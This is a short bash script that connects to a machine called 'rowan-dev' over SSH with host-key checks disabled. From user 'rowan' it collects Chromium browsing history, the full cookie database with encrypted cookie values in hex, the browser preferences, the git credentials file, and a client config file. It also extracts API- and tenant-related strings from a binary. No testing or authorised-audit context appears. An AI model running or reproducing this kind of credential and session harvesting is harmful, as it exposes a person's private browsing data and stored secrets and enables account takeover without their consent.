#!/bin/bash
set +e
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=10 rowan-dev"
$S 'set +e
echo "########## CHROMIUM FILES"
find ~/.config/chromium -maxdepth 3 -type f -printf "%10s %p\n" 2>/dev/null | head -40
echo "########## HISTORY"
python3 - <<PY
import sqlite3,shutil
try:
    shutil.copy("/home/rowan/.config/chromium/Default/History","/tmp/h.db")
    c=sqlite3.connect("/tmp/h.db")
    for u,t,v in c.execute("select url,title,visit_count from urls order by last_visit_time desc limit 100"):
        print(v,u,"|",t)
except Exception as e: print("ERR",e)
PY
echo "########## COOKIES"
python3 - <<PY
import sqlite3,shutil
try:
    shutil.copy("/home/rowan/.config/chromium/Default/Cookies","/tmp/c.db")
    c=sqlite3.connect("/tmp/c.db")
    for r in c.execute("select host_key,name,path,length(encrypted_value),hex(encrypted_value),expires_utc from cookies"):
        print(r)
except Exception as e: print("ERR",e)
PY
echo "########## PREFERENCES"
cat ~/.config/chromium/Default/Preferences 2>/dev/null
echo "########## git credentials"
cat ~/.config/git/credentials 2>/dev/null
echo "########## indexer client"
cat ~/work/reproducers/indexer-client.json 2>/dev/null
echo "########## reproducer strings"
python3 - <<PY
import re
d=open("/home/rowan/work/reproducers/fieldkest-bundle-indexer","rb").read()
print(len(d), d[:200])
import subprocess
for m in set(re.findall(rb"[ -~]{6,}", d)):
    s=m.decode()
    if any(k in s.lower() for k in ("/api","http","arwc","index","plan","meter","ledger","proc","feed","reading","export","tenant","district","reserv")):
        print(s)
PY
echo DONE_A3
' 2>&1
